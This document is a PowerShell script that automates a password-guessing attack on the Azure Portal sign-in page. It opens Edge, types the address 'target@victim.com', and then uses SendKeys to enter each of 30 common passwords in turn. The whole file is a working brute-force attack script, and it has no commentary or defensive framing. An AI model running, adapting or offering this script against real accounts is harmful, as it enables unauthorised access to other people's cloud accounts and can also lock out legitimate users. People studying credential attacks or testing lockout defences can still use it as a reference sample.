# Launch Edge and open Azure Portal
$edge = Start-Process "msedge.exe" -ArgumentList "https://portal.azure.com" -PassThru

# Wait for the page to load (adjust as necessary)
Start-Sleep -Seconds 5

# Enter the email address
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.SendKeys]::SendWait("target@victim.com")

# Press Enter (simulate the Next button)
Start-Sleep -Seconds 1
[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")

# List of 30 commonly used passwords
$passwords = @(
    "Password123", "12345678", "qwerty123", "Welcome1", "Passw0rd",
    "12345", "abc123", "letmein", "admin123", "P@ssw0rd",
    "password1", "1234abcd", "Test@1234", "qazwsx123", "iloveyou",
    "123qwe", "1qaz2wsx", "iloveyou123", "qwerty1", "sunshine",
    "password123", "monkey123", "1qazxsw2", "123123", "qwertyuiop",
    "welcome123", "qwerty12", "admin1234", "letmein123", "1234qwer"
)

# Try logging in 30 times with different passwords
foreach ($pwd in $passwords) {
    # Wait for the page to load (adjust as necessary)
    Start-Sleep -Seconds 5

    # Enter the password
    [System.Windows.Forms.SendKeys]::SendWait($pwd)

    # Press Enter (simulate the login button)
    Start-Sleep -Seconds 1
    [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")

    # Wait a bit before trying the next password
    Start-Sleep -Seconds 5
}

# Close Edge browser after completion
$edge | Stop-Process
